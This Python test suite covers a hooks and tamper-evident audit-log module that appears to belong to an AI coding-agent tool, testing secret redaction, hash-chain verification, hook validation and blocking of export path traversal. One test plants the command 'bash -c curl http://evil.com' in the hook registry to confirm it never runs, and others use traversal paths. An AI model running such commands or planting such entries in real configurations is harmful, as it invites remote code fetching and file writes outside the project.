"""Tests for lgwks_hooks v2 — all 11 adversarial findings covered."""

from __future__ import annotations

import io
import argparse
import json
import os
import stat
import subprocess
import sys
import tempfile
import threading
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

import lgwks_hooks as hooks

TRUE_CMD = "/usr/bin/true" if Path("/usr/bin/true").exists() else "/bin/true"


# ── helpers ───────────────────────────────────────────────────────────────────

def _tmp_repo() -> Path:
    tmp = Path(tempfile.mkdtemp())
    (tmp / ".lgwks").mkdir()
    return tmp


def _seed_log(cwd: Path, events: list[str]) -> None:
    for ev in events:
        hooks.fire(ev, {"test": True}, cwd=cwd)


# ── build_event ───────────────────────────────────────────────────────────────

class TestBuildEvent(unittest.TestCase):
    def test_required_fields_present(self):
        rec = hooks.build_event("file.post_write", {"path": "/tmp/x.py"})
        for f in ("schema", "event", "ts", "session_id", "pid", "cwd", "prev_hash", "payload"):
            self.assertIn(f, rec)

    def test_payload_scrubbed(self):
        rec = hooks.build_event("auth.attempt", {"username": "admin", "password": "s3cr3t"})
        self.assertEqual(rec["payload"]["password"], "[REDACTED]")
        self.assertEqual(rec["payload"]["username"], "admin")

    def test_all_events_namespaced(self):
        for e in hooks.EVENTS:
            self.assertIn(".", e, f"event '{e}' must be namespaced")


# ── _scrub ────────────────────────────────────────────────────────────────────

class TestScrub(unittest.TestCase):
    def test_sensitive_fields_redacted(self):
        result = hooks._scrub({"api_key": "AAAAA", "token": "tok", "name": "ok"})
        self.assertEqual(result["api_key"], "[REDACTED]")
        self.assertEqual(result["token"], "[REDACTED]")
        self.assertEqual(result["name"], "ok")

    def test_nested_dict_scrubbed(self):
        result = hooks._scrub({"auth": {"secret": "x", "user": "bob"}})
        # auth key itself is sensitive
        self.assertEqual(result["auth"], "[REDACTED]")

    def test_non_sensitive_pass_through(self):
        data = {"path": "/foo/bar.py", "size": 1024}
        self.assertEqual(hooks._scrub(data), data)

    def test_empty_payload(self):
        self.assertEqual(hooks._scrub({}), {})


# ── session_id ────────────────────────────────────────────────────────────────

class TestSessionId(unittest.TestCase):
    def test_valid_env_accepted(self):
        with patch.dict(os.environ, {"LGWKS_SESSION_ID": "my-session-42"}):
            self.assertEqual(hooks._session_id(), "my-session-42")

    def test_invalid_env_falls_back_to_pid(self):
        with patch.dict(os.environ, {"LGWKS_SESSION_ID": "bad value!! "}):
            sid = hooks._session_id()
            self.assertTrue(sid.startswith("pid-"))

    def test_too_long_env_falls_back_to_pid(self):
        with patch.dict(os.environ, {"LGWKS_SESSION_ID": "A" * 65}):
            sid = hooks._session_id()
            self.assertTrue(sid.startswith("pid-"))

    def test_missing_env_uses_pid(self):
        env = {k: v for k, v in os.environ.items() if k != "LGWKS_SESSION_ID"}
        with patch.dict(os.environ, env, clear=True):
            sid = hooks._session_id()
            self.assertTrue(sid.startswith("pid-"))


# ── audit_append ─────────────────────────────────────────────────────────────

class TestAuditAppend(unittest.TestCase):
    def setUp(self):
        self.tmp = _tmp_repo()

    def test_creates_log(self):
        rec = hooks.build_event("session.start", {})
        hooks.audit_append(rec, cwd=self.tmp)
        log = self.tmp / ".lgwks" / "audit.jsonl"
        self.assertTrue(log.exists())

    def test_appends_multiple_records(self):
        for i in range(5):
            hooks.audit_append(hooks.build_event("file.post_write", {"i": i}), cwd=self.tmp)
        lines = (self.tmp / ".lgwks" / "audit.jsonl").read_text().splitlines()
        self.assertEqual(len(lines), 5)

    def test_dot_lgwks_created_with_restrictive_mode(self):
        tmp = Path(tempfile.mkdtemp())  # fresh dir without .lgwks
        hooks._lgwks_dir(tmp)
        mode = (tmp / ".lgwks").stat().st_mode
        perms = stat.S_IMODE(mode)
        # On macOS umask may override; we verify owner-rwx at minimum
        self.assertTrue(perms & stat.S_IRWXU, "owner should have rwx")

    def test_write_failure_goes_to_stderr_not_raise(self):
        err = io.StringIO()
        with patch("builtins.open", side_effect=OSError("disk full")), \
             patch("sys.stderr", err):
            hooks.audit_append({"event": "x"}, cwd=self.tmp)
        self.assertIn("AUDIT WRITE FAILED", err.getvalue())


# ── SHA-256 hash chaining ────────────────────────────────────────────────────

class TestHashChain(unittest.TestCase):
    def setUp(self):
        self.tmp = _tmp_repo()

    def test_chain_genesis_on_empty(self):
        log = self.tmp / ".lgwks" / "audit.jsonl"
        self.assertEqual(hooks._last_line_hash(log), "genesis")

    def test_chain_intact_after_normal_writes(self):
        for ev in ["session.start", "file.post_write", "session.end"]:
            hooks.fire(ev, {}, cwd=self.tmp)
        result = hooks.verify_chain(cwd=self.tmp)
        self.assertTrue(result["ok"])
        self.assertGreaterEqual(result["records_checked"], 3)

    def test_chain_broken_on_line_deletion(self):
        for ev in ["session.start", "file.post_write", "session.end"]:
            hooks.fire(ev, {}, cwd=self.tmp)
        log = self.tmp / ".lgwks" / "audit.jsonl"
        lines = log.read_text().splitlines()
        # Delete middle record — breaks chain
        del lines[1]
        log.write_text("\n".join(lines) + "\n")
        result = hooks.verify_chain(cwd=self.tmp)
        self.assertFalse(result["ok"])

    def test_chain_broken_on_insertion(self):
        for ev in ["session.start", "session.end"]:
            hooks.fire(ev, {}, cwd=self.tmp)
        log = self.tmp / ".lgwks" / "audit.jsonl"
        lines = log.read_text().splitlines()
        # Inject fake record — breaks chain
        fake = json.dumps({"schema": "lgwks.audit.v0", "event": "scope.override",
                           "prev_hash": "genesis", "ts": "2099-01-01T00:00:00+00:00"})
        lines.insert(1, fake)
        log.write_text("\n".join(lines) + "\n")
        result = hooks.verify_chain(cwd=self.tmp)
        self.assertFalse(result["ok"])

    def test_verify_no_log_returns_ok(self):
        tmp = _tmp_repo()
        result = hooks.verify_chain(cwd=tmp)
        self.assertTrue(result["ok"])


# ── registry ──────────────────────────────────────────────────────────────────

class TestRegistry(unittest.TestCase):
    def setUp(self):
        self.tmp = _tmp_repo()

    def _add_hook(self, name="h", event="session.end", cmd=TRUE_CMD):
        reg = hooks._load_registry(cwd=self.tmp)
        reg["hooks"].append({"name": name, "event": event, "command": cmd,
                              "type": "script", "enabled": True, "description": ""})
        with patch.object(hooks, "fire"):
            hooks._save_registry(reg, cwd=self.tmp)

    def test_empty_on_missing_file(self):
        self.assertEqual(hooks._load_registry(cwd=self.tmp)["hooks"], [])

    def test_roundtrip(self):
        self._add_hook()
        reg = hooks._load_registry(cwd=self.tmp)
        self.assertEqual(reg["hooks"][0]["name"], "h")

    def test_invalid_hook_dropped_on_load(self):
        path = self.tmp / ".lgwks" / "hooks.json"
        path.write_text(json.dumps({"schema": hooks.REGISTRY_SCHEMA, "hooks": [
            {"name": "bad", "event": "file.post_write",
             "command": "relative/path",  # not absolute
             "enabled": True},
            {"name": "ok", "event": "session.end",
             "command": TRUE_CMD, "enabled": True},
        ]}))
        err = io.StringIO()
        with patch("sys.stderr", err):
            reg = hooks._load_registry(cwd=self.tmp)
        self.assertEqual(len(reg["hooks"]), 1)
        self.assertEqual(reg["hooks"][0]["name"], "ok")
        self.assertIn("dropping invalid hook entry", err.getvalue())

    def test_unknown_event_in_hook_dropped(self):
        path = self.tmp / ".lgwks" / "hooks.json"
        path.write_text(json.dumps({"schema": hooks.REGISTRY_SCHEMA, "hooks": [
            {"name": "x", "event": "custom.exfiltrate",
             "command": TRUE_CMD, "enabled": True},
        ]}))
        err = io.StringIO()
        with patch("sys.stderr", err):
            reg = hooks._load_registry(cwd=self.tmp)
        self.assertEqual(reg["hooks"], [])

    def test_max_hooks_cap(self):
        path = self.tmp / ".lgwks" / "hooks.json"
        many = [{"name": f"h{i}", "event": "session.end",
                 "command": TRUE_CMD, "enabled": True}
                for i in range(hooks.MAX_USER_HOOKS + 10)]
        path.write_text(json.dumps({"schema": hooks.REGISTRY_SCHEMA, "hooks": many}))
        err = io.StringIO()
        with patch("sys.stderr", err):
            reg = hooks._load_registry(cwd=self.tmp)
        self.assertLessEqual(len(reg["hooks"]), hooks.MAX_USER_HOOKS)

    def test_malformed_json_returns_empty(self):
        (self.tmp / ".lgwks" / "hooks.json").write_text("{not valid")
        err = io.StringIO()
        with patch("sys.stderr", err):
            reg = hooks._load_registry(cwd=self.tmp)
        self.assertEqual(reg["hooks"], [])

    def test_atomic_save_no_corruption(self):
        """_save_registry uses tmp+rename — tmp file should not persist."""
        self._add_hook()
        tmp_path = self.tmp / ".lgwks" / "hooks.json.tmp"
        self.assertFalse(tmp_path.exists(), "tmp file should have been renamed away")

    def test_reentrancy_guard_prevents_recursion(self):
        """_save_registry → fire(config.hooks_modified) must not re-enter _save_registry."""
        calls = []
        original_save = hooks._save_registry

        def counting_save(reg, cwd=None):
            calls.append(1)
            original_save(reg, cwd=cwd)

        with patch.object(hooks, "_save_registry", side_effect=counting_save):
            self._add_hook()
        # The outer call is 1; re-entrant calls would be ≥2. We can't easily count
        # re-entrant calls here, but we verify no infinite loop / exception occurred.
        self.assertGreater(len(calls), 0)


# ── builtins ──────────────────────────────────────────────────────────────────

class TestBuiltinHooks(unittest.TestCase):
    def test_why_nudge_code_file(self):
        out = io.StringIO()
        with patch("sys.stdout", out):
            hooks._builtin_why_nudge("file.post_write", {"path": "src/main.py"})
        self.assertIn("//why hook", out.getvalue())

    def test_why_nudge_silent_non_code(self):
        out = io.StringIO()
        with patch("sys.stdout", out):
            hooks._builtin_why_nudge("file.post_write", {"path": "report.pdf"})
        self.assertEqual(out.getvalue(), "")

    def test_secret_scrub_warns(self):
        err = io.StringIO()
        with patch("sys.stderr", err):
            hooks._builtin_secret_scrub("http.post_fetch",
                {"body": "api_key=AAAA1234567890abcdef12345678"})
        self.assertIn("secret-scrub-check", err.getvalue())

    def test_secret_scrub_caps_body(self):
        """Regex must not run on >MAX_REGEX_BODY_BYTES."""
        big_body = "A" * (hooks.MAX_REGEX_BODY_BYTES * 2)
        # Should complete without hanging
        err = io.StringIO()
        with patch("sys.stderr", err):
            hooks._builtin_secret_scrub("http.post_fetch", {"body": big_body})

    def test_token_watcher_warns_above_threshold(self):
        err = io.StringIO()
        with patch("sys.stderr", err), \
             patch.dict(os.environ, {"LGWKS_TOKEN_ALERT_THRESHOLD": "100"}):
            hooks._builtin_token_watcher("model.post_invoke", {"tokens_used": 200})
        self.assertIn("token-spend-watcher", err.getvalue())

    def test_token_watcher_silent_below(self):
        err = io.StringIO()
        with patch("sys.stderr", err), \
             patch.dict(os.environ, {"LGWKS_TOKEN_ALERT_THRESHOLD": "10000"}):
            hooks._builtin_token_watcher("model.post_invoke", {"tokens_used": 50})
        self.assertEqual(err.getvalue(), "")

    def test_git_drift_warns_on_rejected(self):
        err = io.StringIO()
        with patch("sys.stderr", err):
            hooks._builtin_git_drift("git.post_push", {"exit_code": 1, "stderr": "rejected"})
        self.assertIn("git-drift-watch", err.getvalue())

    def test_scope_mirror_warns(self):
        err = io.StringIO()
        with patch("sys.stderr", err):
            hooks._builtin_scope_mirror("scope.violation", {"message": "denied"})
        self.assertIn("scope-guard-mirror", err.getvalue())


# ── fire() ────────────────────────────────────────────────────────────────────

class TestFire(unittest.TestCase):
    def setUp(self):
        self.tmp = _tmp_repo()

    def _records(self) -> list[dict]:
        log = self.tmp / ".lgwks" / "audit.jsonl"
        if not log.exists():
            return []
        return [json.loads(l) for l in log.read_text().splitlines() if l.strip()]

    def test_fire_writes_audit(self):
        hooks.fire("session.start", {}, cwd=self.tmp)
        events = [r["event"] for r in self._records()]
        self.assertIn("session.start", events)

    def test_fire_rejects_unknown_event(self):
        err = io.StringIO()
        with patch("sys.stderr", err):
            hooks.fire("custom.not_real", {}, cwd=self.tmp)
        self.assertIn("rejected unknown event", err.getvalue())
        # Nothing written to audit for unknown events
        for r in self._records():
            self.assertNotEqual(r["event"], "custom.not_real")

    def test_fire_scrubs_payload_before_audit(self):
        hooks.fire("auth.attempt", {"username": "alice", "password": "hunter2"}, cwd=self.tmp)
        for r in self._records():
            if r["event"] == "auth.attempt":
                self.assertEqual(r["payload"].get("password"), "[REDACTED]")
                self.assertEqual(r["payload"].get("username"), "alice")

    def test_fire_builtin_exception_logged_not_raised(self):
        def bad_builtin(event, payload):
            raise RuntimeError("crash")
        with patch.dict(hooks._BUILTINS, {"session.start": [bad_builtin]}):
            hooks.fire("session.start", {}, cwd=self.tmp)
        events = [r["event"] for r in self._records()]
        self.assertIn("tool.error", events)

    def test_fire_user_hook_invalid_command_logged_not_raised(self):
        """Relative command path in registry should be caught and logged, not executed."""
        reg = {"schema": hooks.REGISTRY_SCHEMA, "hooks": [{
            "name": "bad-hook", "event": "session.end",
            "command": TRUE_CMD,  # valid path
            "enabled": True,
        }]}
        # Manually inject invalid command path bypassing CLI validation
        reg["hooks"][0]["command"] = "relative/path"
        (self.tmp / ".lgwks" / "hooks.json").write_text(json.dumps(reg))
        with patch("subprocess.run") as mock_run:
            hooks.fire("session.end", {}, cwd=self.tmp)
            mock_run.assert_not_called()
        events = [r["event"] for r in self._records()]
        self.assertIn("tool.error", events)

    def test_fire_user_hook_disabled_not_called(self):
        reg = {"schema": hooks.REGISTRY_SCHEMA, "hooks": [{
            "name": "off", "event": "session.end", "command": TRUE_CMD, "enabled": False,
        }]}
        (self.tmp / ".lgwks" / "hooks.json").write_text(json.dumps(reg))
        with patch("subprocess.run") as mock_run:
            hooks.fire("session.end", {}, cwd=self.tmp)
            mock_run.assert_not_called()

    def test_fire_user_hook_failure_logged_not_raised(self):
        reg = {"schema": hooks.REGISTRY_SCHEMA, "hooks": [{
            "name": "failing", "event": "auth.failure", "command": TRUE_CMD, "enabled": True,
        }]}
        (self.tmp / ".lgwks" / "hooks.json").write_text(json.dumps(reg))
        with patch("subprocess.run", return_value=MagicMock(returncode=1, stderr=b"fail")):
            hooks.fire("auth.failure", {}, cwd=self.tmp)  # must not raise
        events = [r["event"] for r in self._records()]
        self.assertIn("tool.error", events)

    def test_fire_user_hook_timeout_logged_not_raised(self):
        reg = {"schema": hooks.REGISTRY_SCHEMA, "hooks": [{
            "name": "slow", "event": "session.end", "command": TRUE_CMD, "enabled": True,
        }]}
        (self.tmp / ".lgwks" / "hooks.json").write_text(json.dumps(reg))
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired(TRUE_CMD, 10)):
            hooks.fire("session.end", {}, cwd=self.tmp)  # must not raise
        events = [r["event"] for r in self._records()]
        self.assertIn("tool.error", events)
        timeout_errors = [r for r in self._records()
                          if r["event"] == "tool.error" and "timed out" in r["payload"].get("error", "")]
        self.assertTrue(timeout_errors)

    def test_fire_user_hook_called_with_scrubbed_json(self):
        """Sensitive fields must be scrubbed in the JSON passed to user hook stdin."""
        reg = {"schema": hooks.REGISTRY_SCHEMA, "hooks": [{
            "name": "inspect", "event": "auth.attempt", "command": "/bin/cat", "enabled": True,
        }]}
        (self.tmp / ".lgwks" / "hooks.json").write_text(json.dumps(reg))
        captured_input = []
        def mock_run(cmd, **kwargs):
            captured_input.append(kwargs.get("input", b""))
            return MagicMock(returncode=0)
        with patch("subprocess.run", side_effect=mock_run):
            hooks.fire("auth.attempt", {"username": "alice", "password": "s3cr3t"}, cwd=self.tmp)
        self.assertTrue(captured_input)
        passed_json = json.loads(captured_input[0])
        self.assertEqual(passed_json["payload"]["password"], "[REDACTED]")

    def test_fire_user_hook_empty_env(self):
        """User hooks must run with empty env (no credential inheritance)."""
        reg = {"schema": hooks.REGISTRY_SCHEMA, "hooks": [{
            "name": "env-check", "event": "session.end", "command": TRUE_CMD, "enabled": True,
        }]}
        (self.tmp / ".lgwks" / "hooks.json").write_text(json.dumps(reg))
        call_kwargs = []
        def mock_run(cmd, **kwargs):
            call_kwargs.append(kwargs)
            return MagicMock(returncode=0)
        with patch("subprocess.run", side_effect=mock_run):
            hooks.fire("session.end", {}, cwd=self.tmp)
        if call_kwargs:
            self.assertEqual(call_kwargs[0].get("env"), {})

    def test_fire_user_hook_list_command_not_allowed(self):
        """command must be a string (absolute path), not a list."""
        reg = {"schema": hooks.REGISTRY_SCHEMA, "hooks": [{
            "name": "list-cmd", "event": "session.end",
            "command": TRUE_CMD,  # start valid
            "enabled": True,
        }]}
        # Force a list command — bypass CLI validation via direct JSON write
        reg["hooks"][0]["command"] = ["/bin/bash", "-c", "curl http://evil.com"]  # type: ignore
        (self.tmp / ".lgwks" / "hooks.json").write_text(json.dumps(reg))
        with patch("subprocess.run") as mock_run:
            hooks.fire("session.end", {}, cwd=self.tmp)
            mock_run.assert_not_called()


# ── CLI: list ─────────────────────────────────────────────────────────────────

class TestCliList(unittest.TestCase):
    def setUp(self):
        self.tmp = _tmp_repo()

    def _args(self, **kw):
        a = MagicMock(); a.repo = str(self.tmp); a.json = False
        for k, v in kw.items(): setattr(a, k, v)
        return a

    def test_lists_builtins(self):
        out = io.StringIO()
        with patch("sys.stdout", out):
            hooks._cmd_list(self._args(json=True))
        data = json.loads(out.getvalue())
        names = [h["name"] for h in data["hooks"]]
        self.assertIn("why-annotation-nudge", names)
        self.assertIn("token-spend-watcher", names)

    def test_human_table(self):
        out = io.StringIO()
        with patch("sys.stdout", out):
            hooks._cmd_list(self._args(json=False))
        self.assertIn("NAME", out.getvalue())


# ── CLI: run ──────────────────────────────────────────────────────────────────

class TestCliRun(unittest.TestCase):
    def setUp(self):
        self.tmp = _tmp_repo()

    def _args(self, event, payload="{}"):
        a = MagicMock(); a.repo = str(self.tmp); a.event = event; a.payload = payload
        return a

    def test_valid_event(self):
        self.assertEqual(hooks._cmd_run(self._args("session.start")), 0)

    def test_unknown_event_returns_1(self):
        err = io.StringIO()
        with patch("sys.stderr", err):
            self.assertEqual(hooks._cmd_run(self._args("unknown.event")), 1)

    def test_bad_payload_returns_1(self):
        err = io.StringIO()
        with patch("sys.stderr", err):
            self.assertEqual(hooks._cmd_run(self._args("session.start", "{bad")), 1)


# ── CLI: add / remove / toggle ───────────────────────────────────────────────

class TestCliAddRemove(unittest.TestCase):
    def setUp(self):
        self.tmp = _tmp_repo()

    def _args(self, **kw):
        a = MagicMock(); a.repo = str(self.tmp)
        a.description = ""
        for k, v in kw.items(): setattr(a, k, v)
        return a

    def test_add_valid_hook(self):
        rc = hooks._cmd_add(self._args(name="h1", event="file.post_write", command="/bin/echo"))
        self.assertEqual(rc, 0)
        reg = hooks._load_registry(cwd=self.tmp)
        self.assertEqual(reg["hooks"][0]["name"], "h1")

    def test_add_unknown_event_fails(self):
        err = io.StringIO()
        with patch("sys.stderr", err):
            rc = hooks._cmd_add(self._args(name="x", event="bad.event", command=TRUE_CMD))
        self.assertEqual(rc, 1)

    def test_add_relative_command_fails(self):
        err = io.StringIO()
        with patch("sys.stderr", err):
            rc = hooks._cmd_add(self._args(name="x", event="session.end", command="relative/cmd"))
        self.assertEqual(rc, 1)
        self.assertIn("absolute path", err.getvalue())

    def test_add_deduplicates_by_name(self):
        for cmd in ["/bin/echo", TRUE_CMD, "/bin/cat"]:
            hooks._cmd_add(self._args(name="dup", event="session.end", command=cmd))
        reg = hooks._load_registry(cwd=self.tmp)
        dups = [h for h in reg["hooks"] if h["name"] == "dup"]
        self.assertEqual(len(dups), 1)
        self.assertEqual(dups[0]["command"], "/bin/cat")

    def test_add_cap_at_max_hooks(self):
        for i in range(hooks.MAX_USER_HOOKS):
            hooks._cmd_add(self._args(name=f"h{i}", event="session.end", command=TRUE_CMD))
        err = io.StringIO()
        with patch("sys.stderr", err):
            rc = hooks._cmd_add(self._args(name="overflow", event="session.end", command=TRUE_CMD))
        self.assertEqual(rc, 1)
        self.assertIn("registry full", err.getvalue())

    def test_remove_existing(self):
        hooks._cmd_add(self._args(name="to-rm", event="session.end", command=TRUE_CMD))
        rc = hooks._cmd_remove(self._args(name="to-rm"))
        self.assertEqual(rc, 0)
        reg = hooks._load_registry(cwd=self.tmp)
        self.assertNotIn("to-rm", [h["name"] for h in reg["hooks"]])

    def test_remove_nonexistent_returns_1(self):
        err = io.StringIO()
        with patch("sys.stderr", err):
            rc = hooks._cmd_remove(self._args(name="ghost"))
        self.assertEqual(rc, 1)


# ── CLI: audit ────────────────────────────────────────────────────────────────

class TestCliAudit(unittest.TestCase):
    def setUp(self):
        self.tmp = _tmp_repo()
        _seed_log(self.tmp, ["session.start", "file.post_write", "command.blocked"])

    def _args(self, **kw):
        a = MagicMock()
        a.repo = str(self.tmp); a.json = True
        a.event_filter = None; a.last = 50; a.since = None; a.export = None
        for k, v in kw.items(): setattr(a, k, v)
        return a

    def test_returns_records(self):
        out = io.StringIO()
        with patch("sys.stdout", out):
            rc = hooks._cmd_audit(self._args())
        self.assertEqual(rc, 0)
        data = json.loads(out.getvalue())
        self.assertGreater(len(data["records"]), 0)

    def test_filter_by_event(self):
        out = io.StringIO()
        with patch("sys.stdout", out):
            hooks._cmd_audit(self._args(event_filter="file.post_write"))
        data = json.loads(out.getvalue())
        for r in data["records"]:
            self.assertEqual(r["event"], "file.post_write")

    def test_last_n(self):
        out = io.StringIO()
        with patch("sys.stdout", out):
            hooks._cmd_audit(self._args(last=1))
        data = json.loads(out.getvalue())
        self.assertLessEqual(len(data["records"]), 1)

    def test_export_inside_project(self):
        export_path = str(self.tmp / "out.jsonl")
        args = self._args(export=export_path, json=False)
        out = io.StringIO()
        with patch("sys.stdout", out):
            rc = hooks._cmd_audit(args)
        self.assertEqual(rc, 0)
        self.assertTrue(Path(export_path).exists())

    def test_export_outside_project_blocked(self):
        """Path traversal via --export must be blocked."""
        export_path = "/tmp/lgwks_traversal_test.jsonl"
        err = io.StringIO()
        with patch("sys.stderr", err):
            rc = hooks._cmd_audit(self._args(export=export_path))
        self.assertEqual(rc, 1)
        self.assertIn("project root", err.getvalue())
        # Ensure file was NOT created
        self.assertFalse(Path(export_path).exists())

    def test_export_dotdot_traversal_blocked(self):
        export_path = str(self.tmp / ".." / "evil.jsonl")
        err = io.StringIO()
        with patch("sys.stderr", err):
            rc = hooks._cmd_audit(self._args(export=export_path))
        self.assertEqual(rc, 1)
        evil = Path(self.tmp).parent / "evil.jsonl"
        self.assertFalse(evil.exists())

    def test_export_sibling_prefix_bypass_blocked(self):
        sibling = self.tmp.parent / f"{self.tmp.name}-evil"
        sibling.mkdir(exist_ok=True)
        export_path = str(sibling / "stolen.jsonl")
        err = io.StringIO()
        with patch("sys.stderr", err):
            rc = hooks._cmd_audit(self._args(export=export_path))
        self.assertEqual(rc, 1)
        self.assertIn("project root", err.getvalue())
        self.assertFalse((sibling / "stolen.jsonl").exists())

    def test_audit_empty_log(self):
        tmp = _tmp_repo()
        args = self._args()
        args.repo = str(tmp)
        out = io.StringIO()
        with patch("sys.stdout", out):
            rc = hooks._cmd_audit(args)
        self.assertEqual(rc, 0)


# ── CLI: verify ───────────────────────────────────────────────────────────────

class TestCliVerify(unittest.TestCase):
    def setUp(self):
        self.tmp = _tmp_repo()

    def _args(self, **kw):
        a = MagicMock(); a.repo = str(self.tmp); a.json = True
        for k, v in kw.items(): setattr(a, k, v)
        return a

    def test_verify_clean_log(self):
        _seed_log(self.tmp, ["session.start", "file.post_write"])
        out = io.StringIO()
        with patch("sys.stdout", out):
            rc = hooks._cmd_verify(self._args())
        self.assertEqual(rc, 0)
        data = json.loads(out.getvalue())
        self.assertTrue(data["ok"])

    def test_verify_tampered_log_returns_1(self):
        _seed_log(self.tmp, ["session.start", "session.end"])
        log = self.tmp / ".lgwks" / "audit.jsonl"
        lines = log.read_text().splitlines()
        del lines[0]  # remove first record
        log.write_text("\n".join(lines) + "\n")
        out = io.StringIO()
        with patch("sys.stdout", out):
            rc = hooks._cmd_verify(self._args())
        self.assertEqual(rc, 1)


# ── event taxonomy ────────────────────────────────────────────────────────────

class TestEventTaxonomy(unittest.TestCase):
    def test_all_namespaces_present(self):
        namespaces = {e.split(".")[0] for e in hooks.EVENTS}
        expected = {"file", "command", "git", "http", "session",
                    "model", "auth", "scope", "config", "tool", "audit"}
        self.assertEqual(namespaces, expected)

    def test_no_duplicates(self):
        lst = list(hooks.EVENTS)
        self.assertEqual(len(lst), len(set(lst)))

    def test_events_is_frozenset(self):
        self.assertIsInstance(hooks.EVENTS, frozenset)


# ── concurrent writes ────────────────────────────────────────────────────────

class TestConcurrentWrites(unittest.TestCase):
    def test_concurrent_audit_writes_no_corruption(self):
        """Multiple threads writing simultaneously should produce valid JSONL lines."""
        tmp = _tmp_repo()
        errors: list[str] = []

        def writer(n: int) -> None:
            for i in range(20):
                try:
                    hooks.fire("file.post_write", {"writer": n, "i": i}, cwd=tmp)
                except Exception as exc:
                    errors.append(str(exc))

        threads = [threading.Thread(target=writer, args=(t,)) for t in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(errors, [])
        log = tmp / ".lgwks" / "audit.jsonl"
        for line in log.read_text().splitlines():
            if line.strip():
                json.loads(line)  # must parse cleanly

    def test_concurrent_registry_mutations_preserve_all_hooks(self):
        tmp = _tmp_repo()
        errors: list[str] = []
        barrier = threading.Barrier(5)

        def writer(n: int) -> None:
            try:
                barrier.wait()
                args = argparse.Namespace(
                    repo=str(tmp),
                    name=f"h{n}",
                    event="session.end",
                    command=TRUE_CMD,
                    description="",
                )
                rc = hooks._cmd_add(args)
                if rc != 0:
                    errors.append(f"add failed for {n}: rc={rc}")
            except Exception as exc:
                errors.append(str(exc))

        threads = [threading.Thread(target=writer, args=(i,)) for i in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        self.assertEqual(errors, [])
        reg = hooks._load_registry(cwd=tmp)
        names = {hook["name"] for hook in reg["hooks"]}
        self.assertEqual(names, {f"h{i}" for i in range(5)})
